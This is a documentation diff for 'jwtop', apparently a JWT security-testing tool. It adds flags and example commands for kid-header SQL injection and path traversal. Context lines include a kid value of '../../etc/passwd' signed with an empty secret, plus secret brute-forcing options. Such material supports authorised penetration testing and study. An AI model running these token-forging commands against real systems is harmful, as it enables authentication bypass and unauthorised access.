@@ -234,6 +234,8 @@ jwtop crack <token> --url <url> [--expected-status <n>] [--key <pem-file>] [--wo
 | `--wordlist` | Path to a newline-delimited file of candidate secrets |
 | `--secret` | Explicit candidate secret (repeatable) |
 | `--workers` | Concurrent workers for secret brute-force (default `8`) |
+| `--kid-sql-table` | Table name for the kid SQL injection payload (default `tokens`) |
+| `--kid-path` | File path for the kid path traversal payload (default `/dev/null`) |
 
 **Offline checks** (cryptographic proof, no server needed):
 
@@ -326,8 +328,10 @@ Prints the recovered secret on success (exit `0`), exits `1` when not found.
 **kidinjection** — manipulate the `kid` header and re-sign.
 
 ```sh
-jwtop exploit kidinjection --mode sql $TOKEN          # SQL injection payload
-jwtop exploit kidinjection --mode path $TOKEN         # path traversal to /dev/null
+jwtop exploit kidinjection --mode sql $TOKEN                              # SQL injection (table: tokens)
+jwtop exploit kidinjection --mode sql --sql-table keys $TOKEN             # SQL injection (custom table)
+jwtop exploit kidinjection --mode path $TOKEN                             # path traversal to /dev/null
+jwtop exploit kidinjection --mode path --path /proc/sys/kernel/ns_last_pid $TOKEN  # custom path
 jwtop exploit kidinjection --mode raw --kid "../../etc/passwd" --secret "" $TOKEN
 ```
 
@@ -336,6 +340,8 @@ jwtop exploit kidinjection --mode raw --kid "../../etc/passwd" --secret "" $TOKE
 | `--mode` | `sql`, `path`, or `raw` (default `sql`) |
 | `--kid` | Override the kid value |
 | `--secret` | HMAC secret to sign with (overrides mode default) |
+| `--sql-table` | Table name for `sql` mode payload (default `tokens`) |
+| `--path` | File path for `path` mode payload (default `/dev/null`) |
 
 ---
 
